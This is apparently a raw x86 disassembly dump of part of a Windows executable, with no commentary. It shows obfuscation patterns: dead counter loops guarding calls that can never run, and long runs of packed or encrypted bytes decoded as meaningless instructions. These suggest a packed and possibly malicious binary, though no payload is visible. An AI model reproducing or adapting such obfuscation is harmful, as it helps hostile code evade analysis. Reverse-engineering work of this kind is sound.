  403214:	es pushf 
  403216:	nop
  403217:	xchg   ebp,eax
  403218:	adc    BYTE PTR [edi],bh
  40321a:	gs pop ebp
  40321c:	inc    eax
  40321d:	mov    DWORD PTR [esi-0x4eb7f467],eax
  403223:	(bad)  
  403225:	shr    BYTE PTR [edx+0x6d],1
  403228:	and    esp,DWORD PTR [ebp-0x76bc2e7d]
  40322e:	fimul  DWORD PTR [edx]
  403230:	adc    BYTE PTR [eax-0x73],0xf5
  403234:	mov    ah,0x3b
  403236:	and    ch,BYTE PTR cs:[edi+ebx*8+0x72e4b34a]
  40323e:	ds push 0x7d
  403241:	in     eax,dx
  403242:	cmp    al,0xbc
  403244:	and    eax,0x30d234fe
  403249:	pop    edi
  40324a:	pop    esi
  40324b:	leave  
  40324c:	ret    0xc
  40324f:	push   ebp
  403250:	mov    ebp,esp
  403252:	mov    eax,ds:0x43c224
  403257:	add    DWORD PTR ds:0x43fbf0,edx
  40325d:	mov    edx,0x32729e
  403262:	movzx  ecx,WORD PTR ds:0x41341a
  403269:	or     DWORD PTR ds:0x445364,ecx
  40326f:	sub    eax,edx
  403271:	mov    ecx,DWORD PTR ds:0x445374
  403277:	or     DWORD PTR ds:0x43fbf4,ecx
  40327d:	mov    ecx,0x7510857
  403282:	and    DWORD PTR ds:0x4427a8,0x43fc00
  40328c:	push   esi
  40328d:	and    DWORD PTR ds:0x4105cb,0x0
  403297:	jmp    0x4032a9
  40329c:	mov    esi,DWORD PTR ds:0x4105cb
  4032a2:	inc    esi
  4032a3:	mov    DWORD PTR ds:0x4105cb,esi
  4032a9:	cmp    DWORD PTR ds:0x4105cb,0x18
  4032b0:	jae    0x4032e1
  4032b6:	cmp    DWORD PTR ds:0x4105cb,0x24
  4032bd:	jne    0x4032dc
  4032c3:	push   0x2dca
  4032c8:	push   0x41071f
  4032cd:	push   DWORD PTR [ebp-0x18]
  4032d0:	push   DWORD PTR [ebp-0x18]
  4032d3:	push   DWORD PTR [ebp-0x10]
  4032d6:	call   DWORD PTR ds:0x43c4e4
  4032dc:	jmp    0x40329c
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	add    DWORD PTR ds:0x43fbd8,0x43fbec
  4032ee:	xor    eax,ecx
  4032f0:	cmp    eax,esi
  4032f2:	je     0x403532
  4032f8:	mov    eax,ds:0x43c21c
  4032fd:	xor    DWORD PTR ds:0x445380,0x43cf
  403307:	jmp    0x4033ac
  40330c:	rol    BYTE PTR ds:0xad798db9,1
  403312:	loopne 0x403391
  403314:	dec    esi
  403315:	push   edi
  403316:	mov    cl,0x6e
  403318:	sbb    eax,0xeea4c234
  40331d:	add    bh,BYTE PTR [esp+edi*2-0xc]
  403321:	jl     0x40339f
  403323:	jl     0x403307
  403325:	adc    eax,0xf34fdd2f
  40332a:	frstor [ecx+0x35]
  40332d:	out    dx,al
  40332e:	in     al,dx
  40332f:	xchg   esp,eax
  403330:	cmp    al,0x89
  403332:	jl     0x403399
  403334:	pop    esi
  403335:	retf   0x9c70
  403338:	sbb    BYTE PTR [edx-0x16442c6],0x78
  40333f:	dec    ebp
  403340:	push   cs
  403341:	sti    
  403342:	jno    0x403330
  403344:	and    al,0x96
  403346:	inc    esi
  403347:	shr    DWORD PTR [ebx],cl
  403349:	mov    ebx,0x2b938b90
  40334e:	xchg   al,al
  403350:	mov    edx,0x6256bb90
  403355:	sub    al,BYTE PTR [edi+edx*2-0x73]
  403359:	inc    edx
  40335a:	and    dl,cl
  40335c:	jp     0x4033ad
  40335e:	(bad)  
  40335f:	div    eax
  403361:	push   ecx
  403362:	add    eax,0xb4403c80
  403367:	mov    ebx,0xa9f79af8
  40336c:	leave  
  40336d:	pusha  
  40336e:	dec    ebp
  40336f:	push   esi
  403370:	in     al,0x50
  403372:	jo     0x4033cb
  403374:	ds (bad) 
  403377:	les    esi,FWORD PTR [ebx]
  403379:	xlat   BYTE PTR ds:[ebx]
  40337a:	xor    eax,0x582cf8ad
  40337f:	in     eax,dx
  403380:	leave  
  403381:	sub    DWORD PTR [ecx-0x4cc2612e],eax
  403387:	add    eax,esp
  403389:	cmp    ebx,DWORD PTR [edi-0x53070ced]
  40338f:	sbb    bl,BYTE PTR [ebp+0x7e970a55]
  403395:	mov    bh,BYTE PTR [ebx+0x6f4d1038]
  40339b:	sbb    bh,bl
  40339d:	daa    
  40339e:	adc    esp,ebx
  4033a0:	shl    ebp,cl
  4033a2:	into   
  4033a3:	sub    eax,0xf708549f
  4033a8:	cmp    eax,0x8bb1f7af
  4033ad:	jne    0x4033bb
  4033af:	sub    eax,edx
  4033b1:	jmp    0x403456
  4033b6:	sahf   
  4033b7:	and    al,0xc4
  4033b9:	cwde   
  4033ba:	inc    esi
  4033bb:	js     0x40340f
  4033bd:	cmp    dl,BYTE PTR [eax+0x4a]
  4033c0:	fucomp st(0)
  4033c2:	lahf   
  4033c3:	mov    eax,ds:0x266b951
  4033c8:	jl     0x403446
  4033ca:	hlt    
  4033cb:	jl     0x403449
  4033cd:	jl     0x4033e3
  4033cf:	pusha  
  4033d0:	call   0xf84b98fb
  4033d5:	mov    ds:0xcf12f05e,al
  4033da:	sbb    ch,BYTE PTR [edi-0x33]
  4033dd:	inc    eax
  4033de:	inc    ebp
  4033df:	mov    WORD PTR [eax-0x30],?
  4033e2:	in     eax,dx
  4033e3:	jle    0x4033a9
  4033e5:	pop    eax
  4033e6:	sub    DWORD PTR [edi],edi
  4033e8:	in     eax,0x3a
  4033ea:	cld    
  4033eb:	clc    
  4033ec:	mov    eax,0x8c4d5740
  4033f1:	fiadd  DWORD PTR [edi]
  4033f3:	in     al,dx
  4033f4:	mov    ds:0xc36afc76,al
  4033f9:	push   0xffffff89
  4033fb:	(bad)  
  4033fc:	fs ja  0x40342e
  4033ff:	imul   esp,ecx,0xd396500e
  403405:	push   es
  403406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403407:	or     bl,BYTE PTR [esi]
  403409:	pusha  
  40340a:	mov    BYTE PTR ds:0xbe0591aa,ch
  403410:	jle    0x403481
  403412:	shl    DWORD PTR [eax+0x554b809f],cl
  403418:	mov    ebx,0xaf4729e1
  40341d:	cmc    
  40341e:	add    BYTE PTR [ebp+0x28],cl
  403421:	sahf   
  403422:	xchg   esi,eax
  403424:	pop    ebp
  403425:	xchg   ebx,eax
  403426:	cld    
  403427:	jae    0x403459
  403429:	das    
  40342a:	mov    eax,ds:0x4a3d9667
  403430:	scas   eax,DWORD PTR es:[edi]
  403431:	ins    DWORD PTR es:[edi],dx
  403432:	dec    esp
  403433:	jecxz  0x403462
  403435:	push   eax
  403436:	or     DWORD PTR [ecx+0x23],esi
  403439:	inc    esp
  40343a:	mov    ah,BYTE PTR [ebx+ecx*1]
  40343d:	daa    
  40343e:	mov    edi,0x56fdcfc1
  403443:	repnz xchg ebp,eax
  403445:	cmp    bh,dh
  403447:	push   edi
  403448:	retf   0x4fca
  40344b:	enter  0x2293,0x95
  40344f:	bound  esi,QWORD PTR [eax-0x6a]
  403452:	sub    BYTE PTR [edx-0x3eccd97d],cl
  403458:	cmp    eax,esi
  40345a:	jne    0x403470
  403460:	mov    eax,ds:0x43c224
  403465:	add    eax,DWORD PTR ds:0x43c21c
  40346b:	jmp    0x40351c
  403470:	mov    eax,DWORD PTR [ebp+0xc]
  403473:	xor    eax,ecx
  403475:	jmp    0x40351a
  40347a:	ficomp WORD PTR [edx+0x22]
  40347d:	mov    WORD PTR [edx+0x277a5264],?
  403483:	adc    eax,0x152dfc0e
  403488:	fs (bad) 
  40348a:	inc    BYTE PTR ds:0x7cf47c7c
  403490:	jl     0x40350e
  403492:	xchg   ebp,eax
  403493:	jae    0x403469
  403495:	test   eax,0x5f663538
  40349a:	icebp  
  40349b:	push   edi
  40349c:	(bad)  
  40349d:	jle    0x4034db
  40349f:	outs   dx,DWORD PTR ds:[esi]
  4034a0:	jnp    0x403494
  4034a2:	je     0x40348e
  4034a4:	inc    esp
  4034a5:	mov    bl,0xc5
  4034a7:	inc    esp
  4034a8:	dec    ebx
  4034a9:	or     ebp,esi
  4034ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ac:	rcl    ecx,1
  4034ae:	fwait
  4034af:	in     eax,dx
  4034b0:	loopne 0x40351c
  4034b2:	pushf  
  4034b3:	js     0x40343e
  4034b5:	push   edx
  4034b6:	jl     0x4034ef
  4034b8:	and    DWORD PTR [edx+0x4746cbe3],esp
  4034be:	xor    edx,DWORD PTR [edx]
  4034c0:	mov    edi,0x131c12e2
  4034c5:	in     eax,0x15
  4034c7:	mov    BYTE PTR [edi],cl
  4034c9:	idiv   ecx
  4034cb:	mov    DWORD PTR [eax-0x695c4189],ebp
  4034d1:	ror    BYTE PTR [esp+ecx*8],0xe8
  4034d5:	cmp    DWORD PTR [ebx],ebp
  4034d7:	pop    ebp
  4034d8:	ja     0x4034ab
  4034da:	repnz (bad) 
  4034dc:	(bad)  
  4034de:	ret    0x763a
  4034e1:	xor    BYTE PTR [ebp-0x57fa933b],ch
  4034e7:	data16 mov al,ds:0xeeec259b
  4034ed:	add    dl,dh
  4034ef:	mov    al,ds:0x4dbaba93
  4034f4:	xchg   esi,eax
  4034f5:	pop    ebp
  4034f6:	dec    esp
  4034f7:	repz cmp dh,BYTE PTR [bx+si]
  4034fb:	mov    al,0xea
  4034fd:	pop    ss
  4034fe:	mov    eax,ds:0xe0ceea16
  403503:	dec    ecx
  403504:	out    0xc7,eax
  403506:	dec    ecx
  403507:	ret    
  403508:	shl    ebp,0x22
  40350b:	adc    edi,esi
  40350d:	adc    edi,DWORD PTR [ecx]
  40350f:	in     al,dx
  403510:	aad    0xb1
  403512:	mov    ebx,0x68d658e5
  403517:	popa   
  403518:	add    ch,BYTE PTR [ebx+eax*1-0x3e]
  40351c:	mov    ds:0x43c21c,eax
  403521:	mov    eax,DWORD PTR [ebp+0xc]
  403524:	xor    eax,ecx
  403526:	add    eax,edx
  403528:	mov    ds:0x43c224,eax
  40352d:	jmp    0x40353c
  403532:	mov    eax,ds:0x43c224
  403537:	mov    ds:0x43c21c,eax
  40353c:	mov    eax,DWORD PTR [ebp+0x8]
  40353f:	mov    eax,DWORD PTR [eax]
  403541:	mov    ecx,DWORD PTR ds:0x43c21c
  403547:	add    DWORD PTR [eax],ecx
  403549:	pop    esi
  40354a:	pop    ebp
  40354b:	ret    0x8
  40354e:	push   ebp
  40354f:	mov    ebp,esp
  403551:	sub    esp,0x44
  403554:	push   edi
  403555:	mov    eax,DWORD PTR [ebp+0xc]
  403558:	and    edi,DWORD PTR ds:0x43fbdc
  40355e:	mov    DWORD PTR [ebp-0x10],eax
  403561:	mov    DWORD PTR ds:0x44537c,0x11
  40356b:	cmp    DWORD PTR ds:0x44537c,0x0
  403572:	je     0x4035af
  403578:	cmp    DWORD PTR ds:0x44537c,0x1d
  40357f:	jne    0x403595
  403585:	push   0x410650
  40358a:	push   0x410666
  40358f:	call   DWORD PTR ds:0x43c82c
  403595:	mov    eax,ds:0x44537c
  40359a:	dec    eax
  40359b:	mov    ds:0x44537c,eax
  4035a0:	jmp    0x40356b
  4035a5:	xor    DWORD PTR ds:0x4427b4,0x5830
  4035af:	mov    eax,DWORD PTR [ebp+0x8]
  4035b2:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4035b9:	mov    edi,DWORD PTR ds:0x4427a8
  4035bf:	xor    DWORD PTR ds:0x4427b8,edi
  4035c5:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4035cc:	xor    edx,DWORD PTR ds:0x41340a
  4035d2:	mov    edx,DWORD PTR [ebp+0x8]
  4035d5:	and    edi,edi
  4035d7:	jmp    0x40373c
  4035dc:	loopne 0x4035cc
  4035de:	enter  0xcaef,0xfd
  4035e2:	sti    
  4035e3:	in     eax,0xa8
  4035e5:	cmp    eax,edi
  4035e7:	jg     0x40364e
  4035e9:	rcl    DWORD PTR [edi+0x7c0476d5],0x7c
  4035f0:	xor    al,0x7f
  4035f2:	jl     0x403670
  4035f4:	jno    0x403602
  4035f6:	(bad)  
  4035f7:	xchg   edi,eax
  4035f8:	push   ecx
  4035f9:	sbb    eax,DWORD PTR [ebx-0x72f47770]
  4035ff:	mov    ecx,0xec495009
  403604:	pop    ds
  403605:	push   0xffffffff
  403607:	pop    es
  403608:	xchg   edi,eax
  403609:	inc    esp
  40360a:	mov    ah,0x94
  40360c:	ret    0x5ef6
  40360f:	imul   DWORD PTR [eax+0x17]
  403612:	mov    es,WORD PTR [eax]
  403614:	cmp    DWORD PTR [edi],esp
  403616:	pusha  
  403617:	jno    0x4035fd
  403619:	rcr    dl,cl
  40361b:	inc    edi
  40361c:	dec    edx
  40361d:	mov    al,ds:0x245fa76f
  403622:	push   esi
  403623:	xchg   edx,eax
  403624:	fmul   DWORD PTR [edi+0x45]
  403627:	jo     0x4035c1
  403629:	fucomi st,st(0)
  40362b:	setge  BYTE PTR [ebp+edi*8-0x4857f65]
  403633:	ins    BYTE PTR es:[edi],dx
  403634:	sbb    eax,0xf9aa7ed6
  403639:	adc    al,0x99
  40363b:	clc    
  40363c:	sahf   
  40363d:	popf   
  40363e:	scas   al,BYTE PTR es:[edi]
  40363f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403640:	in     eax,dx
  403641:	lods   eax,DWORD PTR ds:[esi]
  403642:	lahf   
  403643:	xor    al,0x5f
  403645:	and    al,0x5b
  403647:	fidivr WORD PTR [ecx+edi*2]
  40364a:	pop    esi
  40364b:	sub    DWORD PTR [edx],edi
  40364d:	stc    
  40364e:	pop    es
  40364f:	push   ds
  403650:	jecxz  0x4036c2
  403652:	xchg   BYTE PTR [eax-0x76],ch
  403655:	pop    ebp
  403656:	in     al,0xe9
  403658:	add    eax,0xe4e48390
  40365d:	shl    DWORD PTR [ebx+0x70],1
  403660:	fld    st(2)
  403662:	jg     0x403609
  403664:	std    
  403665:	ficomp DWORD PTR [edx+ebp*2-0x559b1e20]
  40366c:	mov    al,ds:0x47eaaf9d
  403671:	in     al,0xbf
  403673:	pop    es
  403674:	ret    0xd2de
  403677:	push   0x2add1925
  40367c:	scas   eax,DWORD PTR es:[edi]
  40367d:	add    al,0xd2
  40367f:	and    BYTE PTR [edi],dh
  403681:	cmp    ah,dh
  403683:	es pop ecx
  403685:	jmp    0x2b11b79b
  40368a:	push   edx
  40368b:	adc    ebx,DWORD PTR [edx]
  40368d:	pop    ds
  40368e:	lahf   
  40368f:	sub    ecx,DWORD PTR [ebx-0x715baf9]
  403695:	(bad)  
  403696:	cmp    al,0xaf
  403698:	mov    esp,0x8ecd8d05
  40369d:	dec    ecx
  40369e:	pop    ecx
  40369f:	dec    ecx
  4036a0:	or     eax,0xb1dad5d
  4036a5:	push   esi
  4036a6:	adc    DWORD PTR cs:[ebx-0x4f5276ca],0xee57ae11
  4036b1:	pop    edi
  4036b2:	mov    esi,0xeafce0a5
  4036b7:	fwait
  4036b8:	sub    edi,DWORD PTR [eax]
  4036ba:	pushf  
  4036bb:	clts   
  4036bd:	xchg   esp,eax
  4036be:	ss (bad) 
  4036c0:	dec    edi
  4036c1:	sbb    bh,ah
  4036c3:	ficomp DWORD PTR [ecx+edx*4]
  4036c6:	adc    DWORD PTR [eax-0x78],eax
  4036c9:	xor    eax,0x8beb079b
  4036ce:	dec    esp
  4036cf:	into   
  4036d0:	(bad)  
  4036d1:	xor    eax,0xd2f6b37a
  4036d6:	(bad)  
  4036d7:	pusha  
  4036d8:	inc    esp
  4036d9:	mov    ecx,0x8b983ed
  4036de:	or     al,0x71
  4036e0:	mov    eax,0xf676d598
  4036e5:	les    eax,FWORD PTR ds:0xe1380ee
  4036eb:	adc    BYTE PTR [ebx],ch
  4036ed:	jnp    0x4036eb
  4036ef:	sub    DWORD PTR [edi-0xf4ac546],0x34471db6
  4036f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036fa:	jnp    0x4036ef
  4036fc:	push   0x49
  4036fe:	shl    DWORD PTR [edx-0x42],cl
  403701:	jle    0x4036e6
  403703:	icebp  
  403704:	and    eax,0x86e988fb
  403709:	mov    dl,0xad
  40370b:	stos   BYTE PTR es:[edi],al
  40370c:	fdiv   QWORD PTR [edx+ebx*4+0x20206508]
  403713:	fnsave [ecx+0x69]
  403716:	sbb    eax,edi
  403718:	fld    st(5)
  40371a:	shl    esp,0xd3
  40371d:	call   DWORD PTR [ecx+0x4cdbd057]
  403723:	and    BYTE PTR [edi-0x706f5ec0],bl
  403729:	hlt    
  40372a:	cdq    
  40372b:	cdq    
  40372c:	imul   eax,DWORD PTR [edx+0x46],0x264a715a
  403733:	iret   
  403734:	imul   ecx,DWORD PTR [ecx-0x336a8847],0x56
  40373b:	mov    ecx,DWORD PTR [ecx+0x57b8c045]
  403741:	or     BYTE PTR [ecx+0x7],dl
  403744:	xor    edx,eax
  403746:	mov    ecx,0x32729e
  40374b:	add    edx,ecx
  40374d:	adc    edi,DWORD PTR ds:0x43fbe8
  403753:	mov    DWORD PTR [ebp-0x8],edx
  403756:	mov    edi,DWORD PTR ds:0x43fc14
  40375c:	mov    edx,DWORD PTR ds:0x43fc1c
  403762:	sub    edx,edi
  403764:	xor    edi,DWORD PTR [edi+edx*1]
  403767:	mov    edx,DWORD PTR [ebp+0x8]
  40376a:	xor    edx,eax
  40376c:	not    edi
  40376e:	add    edx,ecx
  403770:	add    DWORD PTR ds:0x43fbdc,ebx
  403776:	mov    DWORD PTR [ebp+0xc],edx
  403779:	and    DWORD PTR ds:0x41340a,0x0
  403783:	mov    edx,DWORD PTR ds:0x41340a
  403789:	inc    edx
  40378a:	mov    DWORD PTR ds:0x41340a,edx
  403790:	cmp    DWORD PTR ds:0x41340a,0x4
  403797:	jne    0x4037b0
  40379d:	push   0x4105bf
  4037a2:	push   DWORD PTR [ebp-0x28]
  4037a5:	push   0x6880
  4037aa:	call   DWORD PTR ds:0x43c830
  4037b0:	cmp    DWORD PTR ds:0x41340a,0x3
  4037b7:	jne    0x4037cc
  4037bd:	xor    edx,edx
  4037bf:	xor    edx,DWORD PTR ds:0x41340a
  4037c5:	inc    edx
  4037c6:	mov    DWORD PTR ds:0x41340a,edx
  4037cc:	cmp    DWORD PTR ds:0x41340a,0x1b
  4037d3:	jb     0x403783
  4037d9:	adc    edi,DWORD PTR ds:0x4427a4
  4037df:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  4037e6:	adc    edi,DWORD PTR ds:0x43fbfc
  4037ec:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4037f3:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  4037fa:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403801:	and    DWORD PTR ds:0x41340e,0x0
  40380b:	jmp    0x40381d
  403810:	mov    edx,DWORD PTR ds:0x41340e
  403816:	inc    edx
  403817:	mov    DWORD PTR ds:0x41340e,edx
  40381d:	cmp    DWORD PTR ds:0x41340e,0x1e
  403824:	jae    0x40386c
  40382a:	cmp    DWORD PTR ds:0x41340e,0xa
  403831:	jne    0x403847
  403837:	push   0x48af
  40383c:	push   0x400000
  403841:	call   DWORD PTR ds:0x43c834
  403847:	cmp    DWORD PTR ds:0x41340e,0x9
  40384e:	jne    0x403861
  403854:	mov    edx,DWORD PTR ds:0x41340e
  40385a:	inc    edx
  40385b:	mov    DWORD PTR ds:0x41340e,edx
  403861:	jmp    0x403810
  403866:	or     DWORD PTR ds:0x43fbec,ecx
  40386c:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  403873:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40387a:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  403881:	or     edi,edx
  403883:	mov    edx,DWORD PTR [ebp+0x8]
  403886:	mov    DWORD PTR ds:0x41341e,0x6ab7
  403890:	xor    edx,eax
  403892:	or     DWORD PTR ds:0x4105db,edx
  403898:	mov    edi,DWORD PTR [ebp-0x10]
  40389b:	add    edx,ecx
  40389d:	cmp    edi,edx
  40389f:	mov    DWORD PTR ds:0x43fbd8,0x7f1d
  4038a9:	je     0x40511b
  4038af:	mov    DWORD PTR ds:0x41340a,0x4e02
  4038b9:	push   ebx
  4038ba:	mov    DWORD PTR ds:0x4427a4,0x557d
  4038c4:	jmp    0x4050f6
  4038c9:	mov    edx,DWORD PTR [ebp-0x8]
  4038cc:	and    DWORD PTR ds:0x445374,0x0
  4038d6:	jmp    0x4038e8
  4038db:	mov    edi,DWORD PTR ds:0x445374
  4038e1:	inc    edi
  4038e2:	mov    DWORD PTR ds:0x445374,edi
  4038e8:	cmp    DWORD PTR ds:0x445374,0x10
  4038ef:	jae    0x403921
  4038f5:	cmp    DWORD PTR ds:0x445374,0x19
  4038fc:	jne    0x403912
  403902:	push   0x7f28
  403907:	push   0x230d
  40390c:	call   DWORD PTR ds:0x43c838
  403912:	jmp    0x4038db
  403917:	mov    DWORD PTR ds:0x43fbdc,0x3377
  403921:	mov    edi,DWORD PTR [ebp-0x10]
  403924:	or     DWORD PTR ds:0x4427bc,0x66ab
  40392e:	jmp    0x403a93
  403933:	std    
  403934:	xor    al,0x25
  403936:	mov    eax,ds:0x487d7d25
  40393b:	add    al,0x98
  40393d:	test   al,0x7f
  40393f:	mov    eax,ds:0xce9764c8
  403944:	pop    es
  403945:	jl     0x4039c3
  403947:	xor    al,0x7f
  403949:	jl     0x4039c7
  40394b:	cmp    eax,DWORD PTR [edx+0x2f]
  40394e:	pop    ecx
  40394f:	outs   dx,BYTE PTR ds:[si]
  403951:	dec    ebp
  403952:	sub    BYTE PTR [edi],bh
  403954:	adc    edx,DWORD PTR [ecx]
  403956:	jno    0x4039d6
  403958:	mov    eax,ds:0xde182176
  40395d:	icebp  
  40395e:	inc    ebp
  40395f:	int    0xa7
  403961:	jns    0x403919
  403963:	add    BYTE PTR [edx+0x5053912a],cl
  403969:	mov    ch,0x86
  40396b:	or     esi,ecx
  40396d:	pop    ecx
  40396e:	ret    0xec54
  403971:	mov    edi,0x9f153ba7
  403976:	pop    es
  403977:	xchg   esp,eax
  403978:	sbb    eax,0xf0db9de5
  40397d:	into   
  40397e:	adc    eax,0x7f506f4a
  403983:	mov    DWORD PTR [eax+eax*2],ecx
  403986:	and    edx,DWORD PTR [edx+esi*1]
  403989:	ficomp WORD PTR [edi-0x775fd387]
  40398f:	xchg   edx,eax
  403990:	inc    esi
  403991:	cmp    BYTE PTR [ebx-0x491c9aed],al
  403997:	mov    ch,0x9e
  403999:	aad    0xb3
  40399b:	add    BYTE PTR ds:0x8d85a6ed,dl
  4039a1:	cwde   
  4039a2:	mov    ebp,0xd985438a
  4039a7:	dec    esp
  4039a8:	fstp   QWORD PTR [ecx+edx*8]
  4039ab:	cmp    ah,BYTE PTR [edx-0x4f9bf135]
  4039b1:	push   ecx
  4039b2:	popa   
  4039b3:	adc    eax,0x415a1da3
  4039b8:	jmp    0xe5fe84af
  4039bd:	pusha  
  4039be:	mov    bl,0x1e
  4039c0:	pusha  
  4039c1:	and    edx,eax
  4039c3:	push   esp
  4039c4:	ret    
  4039c5:	or     BYTE PTR [eax],dh
  4039c7:	icebp  
  4039c8:	out    dx,al
  4039c9:	jb     0x4039eb
  4039cb:	add    BYTE PTR [eax-0x26f148eb],ch
  4039d1:	jmp    DWORD PTR [ebx-0xe]
  4039d4:	or     dh,BYTE PTR [ecx+0x36]
  4039d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d8:	test   DWORD PTR [edx],0xd3e4d0a4
  4039de:	fcomip st,st(2)
  4039e0:	fstp   QWORD PTR [esi+eiz*1+0x2d9d6e91]
  4039e7:	xchg   esp,eax
  4039e8:	cwde   
  4039e9:	inc    ecx
  4039ea:	fcom   QWORD PTR [edx+0x7a469f3a]
  4039f0:	mov    ecx,0xb31d8426
  4039f5:	loopne 0x403a37
  4039f7:	inc    DWORD PTR [ebx-0x63e7948b]
  4039fd:	div    DWORD PTR [ecx+edx*4]
  403a00:	je     0x40398a
  403a02:	scas   al,BYTE PTR es:[edi]
  403a03:	test   eax,0xe2def2b7
  403a08:	xor    eax,0xc4a83596
  403a0d:	mov    bl,0x5
  403a0f:	add    DWORD PTR [edi-0x4657736],ebx
  403a15:	inc    ecx
  403a16:	inc    eax
  403a17:	xchg   esi,eax
  403a18:	jne    0x403a51
  403a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a1b:	repnz sub cl,cl
  403a1e:	inc    esp
  403a1f:	xor    eax,0x396ed529
  403a24:	lds    ecx,FWORD PTR [edi+0xf]
  403a27:	jbe    0x4039fe
  403a29:	test   eax,0x8c98ddf9
  403a2e:	push   0xffffff9c
  403a30:	ret    
  403a31:	out    0x58,ax
  403a34:	mov    ecx,0xfde4667a
  403a39:	inc    edx
  403a3a:	shl    BYTE PTR [esi],cl
  403a3c:	loope  0x4039bf
  403a3e:	mov    ebp,0x8448e628
  403a43:	inc    ebp
  403a44:	(bad)  
  403a45:	out    0x4f,eax
  403a47:	daa    
  403a48:	fmul   st,st(0)
  403a4a:	mov    bl,0x12
  403a4c:	pop    ss
  403a4d:	mov    esi,0xcfd9ae9a
  403a52:	sbb    eax,0x47940d49
  403a57:	not    DWORD PTR [edx]
  403a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a5a:	adc    al,0x35
  403a5c:	dec    edx
  403a5d:	inc    eax
  403a5e:	or     dl,BYTE PTR [ecx+0x20c98f24]
  403a64:	jmp    0x403a76
  403a66:	mov    cl,0xda
  403a68:	int    0x77
  403a6a:	or     al,0x30
  403a6c:	mov    ebx,ebx
  403a6e:	inc    esi
  403a6f:	ret    0x9588
  403a72:	xchg   ebx,eax
  403a73:	out    dx,al
  403a74:	xchg   BYTE PTR [ebp+0x25db77f2],dl
  403a7a:	mov    edi,DWORD PTR [eax+0x39d1540d]
  403a80:	fcom   QWORD PTR [ebx-0x72]
  403a83:	fmul   DWORD PTR [ebx+0x3fda9ef6]
  403a89:	iret   
  403a8a:	sbb    ebx,edi
  403a8c:	jns    0x403af5
  403a8e:	std    
  403a8f:	jae    0x403a96
  403a91:	sbb    dl,BYTE PTR [esi]
  403a93:	sub    edi,edx
  403a95:	adc    DWORD PTR ds:0x445368,0x1ab0
  403a9f:	mov    edx,DWORD PTR [ebp-0x4]
  403aa2:	xor    DWORD PTR ds:0x4427bc,0x35da
  403aac:	xor    edx,eax
  403aae:	xor    DWORD PTR ds:0x4427c0,0x513b
  403ab8:	add    edx,ecx
  403aba:	mov    DWORD PTR ds:0x44536c,0x7aea
  403ac4:	cmp    edi,edx
  403ac6:	mov    DWORD PTR ds:0x4105bf,0x2e05
  403ad0:	jb     0x40511a
  403ad6:	xor    edx,0x3e56
  403adc:	mov    edx,DWORD PTR [ebp-0x28]
  403adf:	mov    edi,DWORD PTR [ebp-0x4]
  403ae2:	xor    edx,eax
  403ae4:	and    DWORD PTR ds:0x43fbd8,0x0
  403aee:	jmp    0x403b02
  403af3:	xor    ebx,ebx
  403af5:	xor    ebx,DWORD PTR ds:0x43fbd8
  403afb:	inc    ebx
  403afc:	mov    DWORD PTR ds:0x43fbd8,ebx
  403b02:	cmp    DWORD PTR ds:0x43fbd8,0x16
  403b09:	jae    0x403b9b
  403b0f:	cmp    DWORD PTR ds:0x43fbd8,0xd
  403b16:	jne    0x403b25
  403b1c:	push   DWORD PTR [ebp-0x18]
  403b1f:	call   DWORD PTR ds:0x43c4e8
  403b25:	cmp    DWORD PTR ds:0x43fbd8,0xc
  403b2c:	jne    0x403b41
  403b32:	xor    ebx,ebx
  403b34:	xor    ebx,DWORD PTR ds:0x43fbd8
  403b3a:	inc    ebx
  403b3b:	mov    DWORD PTR ds:0x43fbd8,ebx
  403b41:	jmp    0x403af3
  403b46:	and    DWORD PTR ds:0x43fbd8,0x0
  403b50:	jmp    0x403b64
  403b55:	xor    ebx,ebx
  403b57:	add    ebx,DWORD PTR ds:0x43fbd8
  403b5d:	inc    ebx
  403b5e:	mov    DWORD PTR ds:0x43fbd8,ebx
  403b64:	cmp    DWORD PTR ds:0x43fbd8,0x19
  403b6b:	jae    0x403b9b
  403b71:	cmp    DWORD PTR ds:0x43fbd8,0x1e
  403b78:	jne    0x403b96
  403b7e:	push   DWORD PTR [ebp-0x1c]
  403b81:	push   0x4801
  403b86:	push   0x66a1
  403b8b:	push   0x3965
  403b90:	call   DWORD PTR ds:0x43c5b4
  403b96:	jmp    0x403b55
  403b9b:	xor    edi,eax
  403b9d:	mov    ebx,DWORD PTR ds:0x43fc04
  403ba3:	mov    ebx,DWORD PTR [ebx]
  403ba5:	sbb    DWORD PTR ds:0x413402,ebx
  403bab:	add    edi,ecx
  403bad:	jmp    0x403d12
  403bb2:	jno    0x403b37
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	imul   esp,DWORD PTR [ebp+0x727dd96d],0x2a
  403bbc:	pop    esi
  403bbd:	clc    
  403bbe:	out    dx,eax
  403bbf:	retf   
  403bc0:	in     eax,0xac
  403bc2:	xchg   BYTE PTR [esi],al
  403bc4:	jl     0x403c42
  403bc6:	xor    al,0x7f
  403bc8:	jl     0x403c46
  403bca:	adc    edx,ebx
  403bcc:	ret    0xedf
  403bcf:	imul   eax,DWORD PTR gs:[edi],0x7d6eb24a
  403bd6:	ds fucomp st(3)
  403bd9:	inc    eax
  403bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bdb:	mov    al,ds:0x50b1dfa7
  403be0:	popw   ds
  403be2:	or     DWORD PTR [edi],eax
  403be4:	add    ebp,DWORD PTR [ebp+0x40]
  403be7:	add    BYTE PTR [ebp-0x23526834],cl
  403bed:	mov    ah,0xc2
  403bef:	adc    bl,dh
  403bf1:	mov    gs,WORD PTR [eax]
